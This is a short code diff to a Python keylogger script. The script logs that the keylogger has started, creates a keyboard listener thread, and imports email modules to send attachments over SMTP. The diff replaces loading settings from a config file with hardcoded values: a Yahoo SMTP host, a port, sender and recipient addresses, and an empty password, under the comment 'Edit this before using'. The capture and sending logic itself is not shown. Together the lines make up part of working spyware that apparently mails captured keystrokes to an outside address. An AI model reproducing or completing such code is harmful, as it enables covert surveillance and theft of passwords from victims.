@@ -11,7 +11,6 @@ from datetime import datetime
 from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from json import load
 from os import mkdir, listdir
 from shutil import rmtree
 from smtplib import SMTP
@@ -162,13 +161,13 @@ if __name__ == "__main__":
   exit_ = False
   log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
   log_f.write(f"\n\n「Keylogger started {get_time(day=True)}」\n")
-  with open("conf.json") as f:
-    data = load(f)
-    SMTP_HOST = data["smtp_host"]
-    SMTP_PORT = data["smtp_port"]
-    SENDER = data["sender"]
-    SMTP_PASSWORD = data["smtp_password"]
-    RECIPIENT = data["recipient"]
+
+  # Edit this before using
+  SMTP_HOST = "smtp.mail.yahoo.com"
+  SMTP_PORT = 587
+  SENDER = "brfox2k6@yahoo.com"
+  SMTP_PASSWORD = ""
+  RECIPIENT = "brfox2k6@gmail.com"
 
   # Create threads
   keyboard = Keyboard_listener(on_press=keyboard_press)
